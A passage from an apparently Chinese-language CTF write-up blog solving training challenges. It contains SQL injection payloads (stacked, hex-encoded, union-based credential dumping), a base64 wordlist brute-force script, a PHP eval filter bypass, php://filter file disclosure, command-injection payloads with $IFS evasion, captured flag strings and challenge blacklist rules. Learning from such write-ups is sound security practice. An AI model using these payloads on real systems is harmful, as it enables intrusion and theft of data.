class="keyword">to</span><span class="string">` word1`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> <span class="string">`words`</span>;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`words`</span> <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">Null</span> auto_increment primary <span class="keyword">key</span>; alert table `words` <span class="keyword">change</span> <span class="string">`flag`</span> <span class="string">`data`</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>结果一样，<br><img src="https://img-blog.csdnimg.cn/20200706124907396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>emmm，我又查看了一遍，发现没修改成功，<br><img src="https://img-blog.csdnimg.cn/20200706125420726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不知道是什么原因，emmm不慌，还有一种方法：<br>PHP中mysql预处理，，不知道，先学习一下<br>参考博客——🔑<a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL的SQL预处理(Prepared)</a><br>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义预处理语句</span></span><br><span class="line">PREPARE stmt_name <span class="keyword">FROM</span> preparable_stmt;</span><br><span class="line"><span class="comment"># 执行预处理语句</span></span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line"><span class="comment"># 删除(释放)定义</span></span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure><p>在mysql命令行中看下<br><img src="https://img-blog.csdnimg.cn/20200706134836577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>真是tql<br><img src="https://img-blog.csdnimg.cn/20200706135040625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以做题了。下面的payload可以用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这个是拼接的十六进制数字，将那一串数字转换为16进制。<br>还有一种方法可以将其转换为ascii码然后在进行转换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">&quot; * from `1919810931114514`&quot;</span>);<span class="keyword">PREPARE</span> sqla <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> sqla;<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>喔，666<br><img src="https://img-blog.csdnimg.cn/20200706125938499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>膜拜大佬，这方法也太强了。</p><h2 id="技能树HTTP协议基础认证"><a href="#技能树HTTP协议基础认证" class="headerlink" title="技能树HTTP协议基础认证"></a>技能树HTTP协议基础认证</h2><p><img src="https://img-blog.csdnimg.cn/20200525223546242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>浏览过一遍网页后，开启代理。点击click进行抓包。<br><img src="https://img-blog.csdnimg.cn/20200525223644319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>用户输入admin 密码随机123<br><img src="https://img-blog.csdnimg.cn/20200525223854595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>找了好久发现这里是输入的用户名和密码。它是进行了base64加密了。所以就需要将字典文件也进行加密。使用大佬写的python脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 字典文件路径</span></span><br><span class="line">dic_file_path = <span class="string">&#x27;./10_million_password_list_top_100.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(dic_file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    password_dic = f.readlines()</span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;admin:&#x27;</span> <span class="comment"># 用户名</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> password_dic:</span><br><span class="line">    str1=str.encode(username + password.strip())</span><br><span class="line">    encodestr = base64.b64encode(str1)</span><br><span class="line">    encodestr=str(encodestr)</span><br><span class="line">    encodestr=encodestr.strip(<span class="string">&#x27;b\&#x27;&#x27;</span>)</span><br><span class="line">    encodestr=encodestr.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;\=&quot;</span>)   <span class="comment">#避免“=”被转译</span></span><br><span class="line">    print(encodestr)</span><br></pre></td></tr></table></figure><p>然后复制一下运行出来的密码<br><img src="https://img-blog.csdnimg.cn/20200525224225717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>重新写一个txt字典文件。进行爆破。<br><img src="https://img-blog.csdnimg.cn/20200525224311965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"><br>然后查看response<br><img src="https://img-blog.csdnimg.cn/20200525224356867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="技能树目录遍历"><a href="#技能树目录遍历" class="headerlink" title="技能树目录遍历"></a>技能树目录遍历</h2><p>第一个办法：傻瓜式操作，一个个找。（位置好像是随机的，可以自己找找）<br><img src="https://img-blog.csdnimg.cn/20200607101605251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>第二种方法：脚本查询<br>使用request库进行查询</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-4d716e1afe267765.sandbox.ctfhub.com:10080/flag_in_here/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        url_test =url+<span class="string">&quot;/&quot;</span>+str(i)+<span class="string">&quot;/&quot;</span>+str(j)</span><br><span class="line">        r = requests.get(url_test)</span><br><span class="line">        r.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        get_file=r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag.txt&quot;</span> <span class="keyword">in</span> get_file:</span><br><span class="line">            print(url_test)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200607102052940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后直接访问URL得到flag</p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p><img src="https://img-blog.csdnimg.cn/20200607103940919.png" alt="m0re" loading="lazy"><br>这个用dirsearch扫描，<br><img src="https://img-blog.csdnimg.cn/20200607104050139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>等它跑一会儿，等到index.php的时候ctrl+C就可以停下来了，不然太多。<br><img src="https://img-blog.csdnimg.cn/2020060710421253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后访问就可以下载了，打开文件<br><img src="https://img-blog.csdnimg.cn/20200607104241921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>界面挺帅的，黑色系列。判断一下闭合符号，发现是单引号闭合的字符型注入。<br><img src="https://img-blog.csdnimg.cn/20200708152717416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这样的登录框，首先应该想到的是万能密码，先看看能不能登录，如果能登陆再看看有没有有效信息，如果没有信息再进行寻常的注入。<br>这个是个简单的注入，所以万能密码就可以直接得到flag了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200708153134136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3fe1ac7-493c-4546-9aeb-5a244f6f254c&#125;</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源码，这个好像没什么难度吧。<br><img src="https://img-blog.csdnimg.cn/2020070815360551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>直接出来了。<br><img src="https://img-blog.csdnimg.cn/20200708153800436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="https://img-blog.csdnimg.cn/20200708154438266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看源码注释说有waf，然后访问源码中提示的calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个就是waf的规则了。需要绕过num，</p><blockquote><p>php的解析规则：当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析</p></blockquote><p>所以进行绕过只需要在num前面加上空格就OK了，<code>num</code>进行过滤，但是<code> num</code>前面加上空格就没有问题了，waf就不会管num之外的东西。<br>查看目录，使用ascii码绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200708160152253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>看到一个flagg的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p>查看到flag是<br><img src="https://img-blog.csdnimg.cn/20200708160337258.png" alt="m0re" loading="lazy"><br>方法二：http请求走私<br>这个看学长总结了，看着有点头大，还是以后基础扎实点了再学这个吧。</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>第一步：f12<br><img src="https://img-blog.csdnimg.cn/20200708231847568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>第二步：点击跳转到另一个页面<br><img src="https://img-blog.csdnimg.cn/20200708232034208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>中间跳转了，所以需要抓包分析<br><img src="https://img-blog.csdnimg.cn/20200708232208984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>找到了，然后访问<br><img src="https://img-blog.csdnimg.cn/20200708232328394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，flag.php可=可能有东西，先访问一下(虽然知道肯定没有结果)<br><img src="https://img-blog.csdnimg.cn/20200708232442327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>现在再来看上面的那个代码，是PHP伪协议的源代码，这里可以使用PHP伪协议，但是看到有过滤，过滤了带有<code>tp</code>的，还有<code>input、data</code>找一个没有过滤的伪协议进行解题。选择filter<br>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200708233000521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>base64解码，<br><img src="https://img-blog.csdnimg.cn/20200708233046833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>ha,这个结果出乎意料，试了几次发现解码问题<br><img src="https://img-blog.csdnimg.cn/20200708233147849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>post类型表单注入，先尝试万能密码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709105728363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出是字符型注入，单引号闭合，接下来可以查询列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 4<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>到四报错，判断有三列。<br><img src="https://img-blog.csdnimg.cn/20200709110232464.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709110724621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>数据库名为<code>geek</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;geek&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709111033910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>题目是loveSQL，所以猜测flag可能在<code>l0ve1ysq1</code>中。<br>然后就是爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;l0ve1ysq1&#x27;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709111335356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个跟sqli-labs第一关几乎一样的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(username,<span class="number">0x3a</span>,<span class="keyword">password</span>) <span class="keyword">from</span> l0ve1ysq1<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709111710317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就能找到flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d96f20f0-79fe-4a7a-998b-4cb9ebf4902b&#125;</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这个题也是很有意思，可能有点linux基础的做起来更容易理解一点。<br>开启环境，是让/?ip，这样可以看出来是让在后面加上IP地址，然后考点应该是命令执行漏洞，先尝试127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20200709112820824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>ping成功了，然后就可以构造我们的命令执行漏洞的payload了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure><p>查看当前目录下的文件<br><img src="https://img-blog.csdnimg.cn/20200709113007716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就是cat一下看看内容。<br>但是发现好像有过滤<br><img src="https://img-blog.csdnimg.cn/20200709113127899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>空格被过滤了。关于命令执行漏洞的各种绕过，我刚学习总结一篇新的博客🥠——<a href="https://blog.csdn.net/qq_45836474/article/details/107248010">命令执行漏洞的各种绕过方式</a><br>我选择<code>$IFS</code>绕过</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|cat$IFSflag.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709122219386.png" alt="m0re" loading="lazy"><br>flag也被过滤了，先查看一下index.php里面的内容。使用<code>$IFS</code>过滤好像没有什么内容返回，尝试一下使用<code>$IFS$1</code><br><img src="https://img-blog.csdnimg.cn/20200709122933625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  